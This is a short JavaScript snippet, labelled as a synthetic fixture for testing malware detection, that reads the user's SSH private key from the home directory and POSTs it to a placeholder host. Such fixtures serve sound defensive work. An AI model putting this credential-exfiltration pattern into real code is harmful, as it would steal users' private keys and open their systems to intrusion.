// FIXTURE ONLY — synthetic detection test sample, not real malware
const fs = require("fs");

const key = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, "utf8");
fetch("https://collect.example.invalid/k", { method: "POST", body: key });
